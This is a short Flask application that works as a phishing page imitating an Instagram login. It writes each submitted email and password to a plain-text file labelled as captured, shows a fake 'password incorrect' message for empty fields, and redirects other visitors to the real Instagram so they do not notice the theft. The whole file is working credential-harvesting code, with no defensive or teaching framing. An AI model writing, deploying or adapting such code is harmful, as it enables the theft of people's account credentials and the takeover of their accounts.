from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# Store a simple "fake error" flag
error_message = ""

@app.route('/')
def index():
    return render_template('index.html', error=None)

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Log credentials
    with open("creds.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    print(f"[CAPTURED] Email: {email}, Password: {password}")

    # OPTIONAL: Add fake error if input looks wrong
    if email.strip() == "" or password.strip() == "":
        error = "Sorry, your password was incorrect. Please double-check your password."
        return render_template('index.html', error=error)

    # If looks fine, redirect to Instagram
    return redirect("https://www.instagram.com/")

if __name__ == "__main__":
    app.run()
